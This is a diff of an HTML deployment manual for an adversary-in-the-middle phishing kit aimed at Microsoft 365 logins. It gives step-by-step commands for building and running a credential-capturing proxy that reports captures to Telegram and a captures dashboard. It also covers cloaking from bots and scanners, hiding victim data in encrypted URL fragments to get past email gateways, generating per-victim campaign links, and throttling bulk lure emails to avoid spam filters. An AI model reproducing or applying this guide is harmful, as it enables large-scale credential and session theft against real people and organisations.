-<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="dt">zone_name</span> <span class="op">=</span> <span class="st">&quot;&lt;domain&gt;&quot;</span></span>
-<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="kw">[[routes]]</span></span>
-<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="dt">pattern</span> <span class="op">=</span> <span class="st">&quot;*.&lt;domain&gt;/*&quot;</span></span>
-<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="dt">zone_name</span> <span class="op">=</span> <span class="st">&quot;&lt;domain&gt;&quot;</span></span></code></pre></div>
-<h3 id="cloudflare-ssltls">Cloudflare SSL/TLS</h3>
-<p>Set to <strong>Flexible</strong> — Cloudflare terminates TLS for
-victims, connects to EC2 via HTTP.</p>
-<h3 id="ec2-instance">EC2 Instance</h3>
+
+<pre><code>name = "glnt-proxy"
+main = "worker.js"
+compatibility_date = "2024-01-01"
+
+[[routes]]
+pattern = "&lt;domain&gt;/*"
+zone_name = "&lt;domain&gt;"
+
+[[routes]]
+pattern = "*&lt;.domain&gt;/*"
+zone_name = "&lt;domain&gt;"</code></pre>
+
+<h3>Cloudflare SSL/TLS</h3>
+
+<p>Set to <strong>Flexible</strong> &mdash; Cloudflare terminates TLS for victims, connects to EC2 via HTTP.</p>
+
+<h3>EC2 Instance</h3>
+
 <pre><code>AMI: Ubuntu 22.04 LTS
 Type: t2.micro (free tier)
 Storage: 20 GB gp3
-Key pair: new → download .pem</code></pre>
-<p><strong>Security Group (CRITICAL):</strong></p>
+Key pair: new &rarr; download .pem</code></pre>
+
+<div class="warn"><strong>Security Group (CRITICAL):</strong></div>
+
 <table>
-<thead>
-<tr>
-<th>Port</th>
-<th>Source</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>22</td>
-<td>Your IP/32</td>
-<td>SSH</td>
-</tr>
-<tr>
-<td>9091</td>
-<td>0.0.0.0/0 (locked to Cloudflare IPs later)</td>
-<td>Proxy server</td>
-</tr>
-<tr>
-<td>9092</td>
-<td>Your IP/32</td>
-<td>Analytics dashboard</td>
-</tr>
-</tbody>
+  <thead><tr><th>Port</th><th>Source</th><th>Purpose</th></tr></thead>
+  <tbody>
+    <tr><td>22</td><td>Your IP/32</td><td>SSH</td></tr>
+    <tr><td>9091</td><td>0.0.0.0/0 (locked to Cloudflare IPs later)</td><td>Proxy server</td></tr>
+    <tr><td>9092</td><td>Your IP/32</td><td>Analytics dashboard</td></tr>
+  </tbody>
 </table>
-<hr />
-<h2 id="server-deployment">4. Server Deployment</h2>
-<h3 id="install-build">Install &amp; Build</h3>
-<div class="sourceCode" id="cb7"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="at">-i</span> your-key.pem ubuntu@<span class="op">&lt;</span>EC2-IP<span class="op">&gt;</span></span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Install Go</span></span>
-<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt update <span class="kw">&amp;&amp;</span> <span class="fu">sudo</span> apt install <span class="at">-y</span> golang-go git</span>
-<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Clone and build</span></span>
-<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/busconductors/azure-phish-kit.git</span>
-<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> azure-phish-kit/proxy-server</span>
-<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="co"># SET THE AES KEY in bootloader.html</span></span>
-<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Generate: cd ../payload-generator &amp;&amp; go run keygen.go</span></span>
-<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Edit bootloader.html: const _k=&#39;YOUR-BASE64-KEY&#39;;</span></span>
-<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="co"># SET THE PHISHLET HOSTNAME in phishlets/microsoft.json</span></span>
-<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Change &quot;hostname&quot;: &quot;login.glnt.cc&quot; to &quot;login.YOUR-DOMAIN&quot;</span></span>
-<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a><span class="ex">go</span> build <span class="at">-o</span> proxy-srv .</span></code></pre></div>
-<h3 id="systemd-service">systemd Service</h3>
-<div class="sourceCode" id="cb8"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> tee /etc/systemd/system/phish-proxy.service <span class="op">&lt;&lt; &#39;EOF&#39;</span></span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="st">[Unit]</span></span>
-<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="st">Description=AiTM Phishing Proxy</span></span>
-<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="st">After=network.target</span></span>
-<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="st">[Service]</span></span>
-<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="st">Type=simple</span></span>
-<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="st">User=ubuntu</span></span>
-<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="st">WorkingDirectory=/home/ubuntu/azure-phish-kit/proxy-server</span></span>
-<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="st">Environment=&quot;TELEGRAM_BOT_TOKEN=&lt;YOUR_BOT_TOKEN&gt;&quot;</span></span>
-<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="st">Environment=&quot;TELEGRAM_CHAT_ID=&lt;YOUR_CHAT_ID&gt;&quot;</span></span>
-<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a><span class="st">Environment=&quot;PHISHING_HOST=&lt;YOUR_DOMAIN&gt;&quot;</span></span>
-<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="st">Environment=&quot;PORT=9091&quot;</span></span>
-<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a><span class="st">ExecStart=/home/ubuntu/azure-phish-kit/proxy-server/proxy-srv</span></span>
-<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="st">Restart=always</span></span>
-<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a><span class="st">RestartSec=5</span></span>
-<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a><span class="st">[Install]</span></span>
-<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a><span class="st">WantedBy=multi-user.target</span></span>
-<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
-<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl daemon-reload</span>
-<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl enable phish-proxy</span>
-<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl start phish-proxy</span>
-<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl status phish-proxy</span></code></pre></div>
-<h3 id="analytics-dashboard-optional">Analytics Dashboard
-(Optional)</h3>
-<div class="sourceCode" id="cb9"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ~/azure-phish-kit/analytics-server</span>
-<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">go</span> build <span class="at">-o</span> analytics-srv .</span>
-<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> tee /etc/systemd/system/phish-analytics.service <span class="op">&lt;&lt; &#39;EOF&#39;</span></span>
-<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="st">[Unit]</span></span>
-<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="st">Description=Analytics Dashboard</span></span>
-<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="st">After=network.target</span></span>
-<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="st">[Service]</span></span>
-<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="st">Type=simple</span></span>
-<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="st">User=ubuntu</span></span>
-<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="st">WorkingDirectory=/home/ubuntu/azure-phish-kit/analytics-server</span></span>
-<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a><span class="st">ExecStart=/home/ubuntu/azure-phish-kit/analytics-server/analytics-srv \</span></span>
-<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a><span class="st">  --data /home/ubuntu/azure-phish-kit/data/captures.jsonl \</span></span>
-<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a><span class="st">  --port 9092 \</span></span>
-<span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a><span class="st">  --token &quot;&lt;STRONG_RANDOM_TOKEN&gt;&quot;</span></span>
-<span id="cb9-17"><a href="#cb9-17" aria-hidden="true" tabindex="-1"></a><span class="st">Restart=always</span></span>
-<span id="cb9-18"><a href="#cb9-18" aria-hidden="true" tabindex="-1"></a><span class="st">RestartSec=5</span></span>
-<span id="cb9-19"><a href="#cb9-19" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb9-20"><a href="#cb9-20" aria-hidden="true" tabindex="-1"></a><span class="st">[Install]</span></span>
-<span id="cb9-21"><a href="#cb9-21" aria-hidden="true" tabindex="-1"></a><span class="st">WantedBy=multi-user.target</span></span>
-<span id="cb9-22"><a href="#cb9-22" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
-<span id="cb9-23"><a href="#cb9-23" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb9-24"><a href="#cb9-24" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl daemon-reload</span>
-<span id="cb9-25"><a href="#cb9-25" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl enable phish-analytics</span>
-<span id="cb9-26"><a href="#cb9-26" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl start phish-analytics</span></code></pre></div>
-<h3 id="verify-deployment">Verify Deployment</h3>
-<div class="sourceCode" id="cb10"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Bootloader serves</span></span>
-<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-I</span> https://<span class="op">&lt;</span>your-domain<span class="op">&gt;</span>/</span>
-<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Expect: HTTP 200, Content-Type: text/html</span></span>
-<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Proxy works (set cookie manually)</span></span>
-<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="va">UPSTREAM</span><span class="op">=</span><span class="va">$(</span><span class="ex">python3</span> <span class="at">-c</span> <span class="st">&quot;import urllib.parse; print(urllib.parse.quote(&#39;https://login.microsoftonline.com/&#39;, safe=&#39;&#39;))&quot;</span><span class="va">)</span></span>
-<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-H</span> <span class="st">&quot;Cookie: _s=</span><span class="va">${UPSTREAM}</span><span class="st">&quot;</span> https://<span class="op">&lt;</span>your-domain<span class="op">&gt;</span>/</span>
-<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Expect: Microsoft 302 redirect or login page HTML</span></span>
-<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Bot blocked</span></span>
-<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-H</span> <span class="st">&quot;User-Agent: Googlebot/2.1&quot;</span> https://<span class="op">&lt;</span>your-domain<span class="op">&gt;</span>/</span>
-<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Expect: HTTP 404</span></span></code></pre></div>
-<hr />
-<h2 id="campaign-operations">5. Campaign Operations</h2>
-<h3 id="generate-a-phishing-url">Generate a Phishing URL</h3>
-<div class="sourceCode" id="cb11"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> payload-generator</span>
-<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Generate key (one-time, keep it secret)</span></span>
-<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ex">go</span> run keygen.go</span>
-<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Output: &lt;BASE64-KEY&gt;</span></span>
-<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Set the key in bootloader.html and rebuild</span></span>
-<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Edit: ../proxy-server/bootloader.html</span></span>
-<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a><span class="co">#   const _k=&#39;&lt;BASE64-KEY&gt;&#39;;</span></span>
-<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Rebuild: cd ../proxy-server &amp;&amp; go build -o proxy-srv .</span></span>
-<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Generate campaign URL</span></span>
-<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a><span class="ex">go</span> run . <span class="dt">\</span></span>
-<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">--key</span> <span class="op">&lt;</span>BASE64-KEY<span class="op">&gt;</span> <span class="dt">\</span></span>
-<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>  <span class="at">--email</span> victim@target.com <span class="dt">\</span></span>
-<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>  <span class="at">--brand</span> microsoft <span class="dt">\</span></span>
-<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a>  <span class="at">--redirect</span> <span class="st">&quot;https://login.microsoftonline.com/common/oauth2/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2&amp;redirect_uri=https://login.&lt;your-domain&gt;&amp;response_type=code&quot;</span> <span class="dt">\</span></span>
-<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>  <span class="at">--campaign</span> spring-phish-001</span>
-<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Construct the URL</span></span>
-<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a><span class="co"># https://&lt;your-domain&gt;/#&lt;ENCRYPTED-FRAGMENT&gt;</span></span></code></pre></div>
-<h3 id="the-url-structure">The URL Structure</h3>
+
+<h2>Server Deployment</h2>
+
+<h3>Install &amp; Build</h3>
+
+<pre><code>ssh -i your-key.pem ubuntu@&lt;EC2-IP&gt;
+
+# Install Go
+sudo apt update &amp;&amp; sudo apt install -y golang-go git
+
+# Clone and build
+git clone https://github.com/busconductors/azure-phish-kit.git
+cd azure-phish-kit/proxy-server
+
+# SET THE AES KEY in bootloader.html
+# Generate: cd ../payload-generator &amp;&amp; go run keygen.go
+# Edit bootloader.html: const _k='YOUR-BASE64-KEY';
+
+# SET THE PHISHLET HOSTNAME in phishlets/microsoft.json
+# Change "hostname": "login.glnt.cc" to "login.YOUR-DOMAIN"
+
+go build -o proxy-srv .</code></pre>
+
+<h3>systemd Service</h3>
+
+<pre><code>sudo tee /etc/systemd/system/phish-proxy.service &lt;&lt; 'EOF'
+[Unit]
+Description=AiTM Phishing Proxy
+After=network.target
+
+[Service]
+Type=simple
+User=ubuntu
+WorkingDirectory=/home/ubuntu/azure-phish-kit/proxy-server
+Environment="TELEGRAM_BOT_TOKEN=&lt;YOUR_BOT_TOKEN&gt;"
+Environment="TELEGRAM_CHAT_ID=&lt;YOUR_CHAT_ID&gt;"
+Environment="PHISHING_HOST=&lt;YOUR_DOMAIN&gt;"
+Environment="PORT=9091"
+ExecStart=/home/ubuntu/azure-phish-kit/proxy-server/proxy-srv
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable phish-proxy
+sudo systemctl start phish-proxy
+sudo systemctl status phish-proxy</code></pre>
+
+<h3>Analytics Dashboard (Optional)</h3>
+
+<pre><code>cd ~/azure-phish-kit/analytics-server
+go build -o analytics-srv .
+
+sudo tee /etc/systemd/system/phish-analytics.service &lt;&lt; 'EOF'
+[Unit]
+Description=Analytics Dashboard
+After=network.target
+
+[Service]
+Type=simple
+User=ubuntu
+WorkingDirectory=/home/ubuntu/azure-phish-kit/analytics-server
+ExecStart=/home/ubuntu/azure-phish-kit/analytics-server/analytics-srv \
+  --data /home/ubuntu/azure-phish-kit/data/captures.jsonl \
+  --port 9092 \
+  --token "&lt;STRONG_RANDOM_TOKEN&gt;"
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable phish-analytics
+sudo systemctl start phish-analytics</code></pre>
+
+<h3>Verify Deployment</h3>
+
+<pre><code># 1. Bootloader serves
+curl -I https://&lt;your-domain&gt;/
+# Expect: HTTP 200, Content-Type: text/html
+
+# 2. Proxy works (set cookie manually)
+UPSTREAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('https://login.microsoftonline.com/', safe=''))")
+curl -H "Cookie: _s=${UPSTREAM}" https://&lt;your-domain&gt;/
+# Expect: Microsoft 302 redirect or login page HTML
+
+# 3. Bot blocked
+curl -H "User-Agent: Googlebot/2.1" https://&lt;your-domain&gt;/
+# Expect: HTTP 404</code></pre>
+
+<h2>Campaign Operations</h2>
+
+<h3>Generate a Phishing URL</h3>
+
+<pre><code>cd payload-generator
+
+# 1. Generate key (one-time, keep it secret)
+go run keygen.go
+# Output: &lt;BASE64-KEY&gt;
+
+# 2. Set the key in bootloader.html and rebuild
+# Edit: ../proxy-server/bootloader.html
+#   const _k='&lt;BASE64-KEY&gt;';
+# Rebuild: cd ../proxy-server &amp;&amp; go build -o proxy-srv .
+
+# 3. Generate campaign URL
+go run . \
+  --key &lt;BASE64-KEY&gt; \
+  --email victim@target.com \
+  --brand microsoft \
+  --redirect "https://login.microsoftonline.com/common/oauth2/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2&amp;redirect_uri=https://login.&lt;your-domain&gt;&amp;response_type=code" \
+  --campaign spring-phish-001
+
+# 4. Construct the URL
+# https://&lt;your-domain&gt;/#&lt;ENCRYPTED-FRAGMENT&gt;</code></pre>
+
+<h3>The URL Structure</h3>
+
 <pre><code>https://glnt.cc/#&lt;base64url-encoded-payload&gt;</code></pre>
-<p>The fragment (<code>#</code>) is never sent to the server in HTTP
-requests. Network scanners, email gateways, and URL reputation checkers
-see only the domain. The encrypted payload exists only in the victim’s
-browser after JavaScript decryption.</p>
-<h3 id="whats-inside-the-fragment">What’s Inside the Fragment</h3>
-<div class="sourceCode" id="cb13"><pre
-class="sourceCode json"><code class="sourceCode json"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
-<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;v&quot;</span><span class="fu">:</span> <span class="st">&quot;1&quot;</span><span class="fu">,</span>           <span class="er">//</span> <span class="er">version</span></span>
-<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;e&quot;</span><span class="fu">:</span> <span class="st">&quot;victim@corp&quot;</span><span class="fu">,</span>  <span class="er">//</span> <span class="er">victim</span> <span class="er">email</span></span>
-<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;b&quot;</span><span class="fu">:</span> <span class="st">&quot;microsoft&quot;</span><span class="fu">,</span>    <span class="er">//</span> <span class="er">brand</span></span>
-<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;t&quot;</span><span class="fu">:</span> <span class="st">&quot;shared-doc&quot;</span><span class="fu">,</span>   <span class="er">//</span> <span class="er">template</span></span>
-<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;r&quot;</span><span class="fu">:</span> <span class="st">&quot;https://login.microsoftonline.com/...&quot;</span><span class="fu">,</span>  <span class="er">//</span> <span class="er">upstream</span> <span class="er">URL</span></span>
-<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;c&quot;</span><span class="fu">:</span> <span class="st">&quot;spring-phish-001&quot;</span><span class="fu">,</span>  <span class="er">//</span> <span class="er">campaign</span> <span class="er">ID</span></span>
-<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;ts&quot;</span><span class="fu">:</span> <span class="dv">1718765432</span>     <span class="er">//</span> <span class="er">timestamp</span></span>
-<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
-<p>Encrypted with AES-256-GCM using the embedded key. 3 random bytes
-prepended before base64url encoding (no fixed
-<code>mv=</code>/<code>bXY9</code> signature).</p>
-<h3 id="stable-link-reference">Stable Link Reference</h3>
-<p>The current active phishing link is always stored at the repository
-root:</p>
+
+<div class="note"><strong>Fragment isolation:</strong> The fragment (<code>#</code>) is never sent to the server in HTTP requests. Network scanners, email gateways, and URL reputation checkers see only the domain. The encrypted payload exists only in the victim's browser after JavaScript decryption.</div>
+
+<h3>What's Inside the Fragment</h3>
+
+<pre><code>{
+  "v": "1",           // version
+  "e": "victim@corp",  // victim email
+  "b": "microsoft",    // brand
+  "t": "shared-doc",   // template
+  "r": "https://login.microsoftonline.com/...",  // upstream URL
+  "c": "spring-phish-001",  // campaign ID
+  "ts": 1718765432     // timestamp
+}</code></pre>
+
+<div class="margin-note">AES-256-GCM. 3 random bytes prepended before base64url encoding &mdash; no fixed signature.</div>
+
+<p>Encrypted with AES-256-GCM using the embedded key. 3 random bytes prepended before base64url encoding (no fixed <code>mv=</code>/<code>bXY9</code> signature).</p>
+
+<h3>Stable Link Reference</h3>
+
+<p>The current active phishing link is always stored at the repository root:</p>
+
 <pre><code>CURRENT_LINK.txt</code></pre>
-<p>This file contains the full
-<code>https://&lt;domain&gt;/#&lt;encrypted-fragment&gt;</code> URL.
-Every time you regenerate the link with <code>payload-generator</code>,
-update this file or symlink to the latest output. Use this as the single
-source of truth for which link is live in the field.</p>
-<hr />
-<h2 id="supermailer-campaign-operations">6. SuperMailer Campaign
-Operations</h2>
-<p>SuperMailer is the delivery vehicle — it sends the HTML lure emails
-to target lists. This section covers end-to-end SuperMailer setup, from
-SMTP configuration to sending and monitoring.</p>
-<h3 id="smtp-setup-in-supermailer">6.1 SMTP Setup in SuperMailer</h3>
+
+<p>This file contains the full <code>https://&lt;domain&gt;/#&lt;encrypted-fragment&gt;</code> URL. Every time you regenerate the link with <code>payload-generator</code>, update this file or symlink to the latest output. Use this as the single source of truth for which link is live in the field.</p>
+
+<h2>SuperMailer Campaign Operations</h2>
+
+<div class="margin-note">SuperMailer is the delivery vehicle. SMTP &rarr; lead list &rarr; HTML lure &rarr; send &rarr; monitor.</div>
+
+<p>SuperMailer is the delivery vehicle &mdash; it sends the HTML lure emails to target lists. This section covers end-to-end SuperMailer setup, from SMTP configuration to sending and monitoring.</p>
+
+<h3>6.1 SMTP Setup in SuperMailer</h3>
+
 <p>Before sending anything, configure the outgoing mail server:</p>
-<ol type="1">
-<li>Open SuperMailer → <strong>Settings</strong> → <strong>SMTP
-Server</strong></li>
-<li>Add a new SMTP profile:</li>
-</ol>
-<pre><code>SMTP Host:       smtp.your-relay.com          (or your ESP&#39;s SMTP)
+
+<div class="step"><p>Open SuperMailer &rarr; <strong>Settings</strong> &rarr; <strong>SMTP Server</strong></p></div>
+<div class="step"><p>Add a new SMTP profile:</p></div>
+
+<pre><code>SMTP Host:       smtp.your-relay.com          (or your ESP's SMTP)
 Port:            587
-Encryption:      STARTTLS                     (SuperMailer calls this &quot;TLS&quot;)
+Encryption:      STARTTLS                     (SuperMailer calls this "TLS")
 Authentication:  Username + Password
 Username:        your-smtp-username
 Password:        your-smtp-password</code></pre>
-<ol start="3" type="1">
-<li>Click <strong>Test Connection</strong> — a green check means it
-works. If it fails, verify the username/password and that your IP is not
-blocked by the relay.</li>
-<li>Set <strong>Throttle: 50-100 emails per hour per sending
-IP</strong>. This is critical — exceeding this rate triggers spam
-filters and burns your sending reputation. If you operate multiple IPs,
-you can scale linearly (e.g., 4 IPs = 400/hr total).</li>
-</ol>
+
+<div class="step"><p>Click <strong>Test Connection</strong> &mdash; a green check means it works. If it fails, verify the username/password and that your IP is not blocked by the relay.</p></div>
+<div class="step"><p>Set <strong>Throttle: 50-100 emails per hour per sending IP</strong>. This is critical &mdash; exceeding this rate triggers spam filters and burns your sending reputation. If you operate multiple IPs, you can scale linearly (e.g., 4 IPs = 400/hr total).</p></div>
+
 <p><strong>Key Settings:</strong></p>
+
 <table>
-<colgroup>
-<col style="width: 33%" />
-<col style="width: 25%" />
-<col style="width: 40%" />
-</colgroup>
-<thead>
-<tr>
-<th>Setting</th>
-<th>Value</th>
-<th>Rationale</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Port</td>
-<td>587</td>
-<td>Standard submission port, universally accepted</td>
-</tr>
-<tr>
-<td>Encryption</td>
-<td>STARTTLS</td>
-<td>Opportunistic TLS — works with nearly all relays</td>
-</tr>
-<tr>
-<td>Max emails/hr</td>
-<td>50-100</td>
-<td>Stay below commercial spam thresholds</td>
-</tr>
-<tr>
-<td>Connection timeout</td>
-<td>30s</td>
-<td>Long enough for slow relays, short enough to fail fast</td>
-</tr>
-<tr>
-<td>Max retries</td>
-<td>2</td>
-<td>Two soft-bounce retries before hard-failing</td>
-</tr>
-</tbody>
+  <thead><tr><th>Setting</th><th>Value</th><th>Rationale</th></tr></thead>
+  <tbody>
+    <tr><td>Port</td><td>587</td><td>Standard submission port, universally accepted</td></tr>
+    <tr><td>Encryption</td><td>STARTTLS</td><td>Opportunistic TLS &mdash; works with nearly all relays</td></tr>
+    <tr><td>Max emails/hr</td><td>50-100</td><td>Stay below commercial spam thresholds</td></tr>
